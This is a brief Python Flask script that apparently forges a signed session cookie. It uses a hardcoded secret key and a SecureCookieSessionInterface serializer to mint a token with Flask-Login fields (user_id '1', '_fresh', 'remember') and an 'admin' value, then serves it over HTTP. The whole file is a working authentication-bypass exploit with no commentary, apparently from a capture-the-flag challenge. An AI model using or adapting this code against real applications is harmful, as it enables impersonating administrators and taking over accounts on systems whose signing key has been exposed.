from flask import Flask,session
from flask.sessions import SecureCookieSessionInterface

app=Flask(__name__)
@app.route('/')
def index():
    scsi = SecureCookieSessionInterface()
    ser = scsi.get_signing_serializer(app)
    session['_fresh'] = True
    session['_id'] = u'ff2303a3a71ab7616f64b0b690214c5e1898a538674218bca25427a021cbc0bdd00f9c38e2d9fa4e6745aa27628c23442d2f48364cb533df5729ace743ba07e1'
    session['user_id'] = u'1'
    session['remember'] = u'set'
    return ser.dumps(u'admin')

app.secret_key='fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
app.run(port=8000,host='0.0.0.0')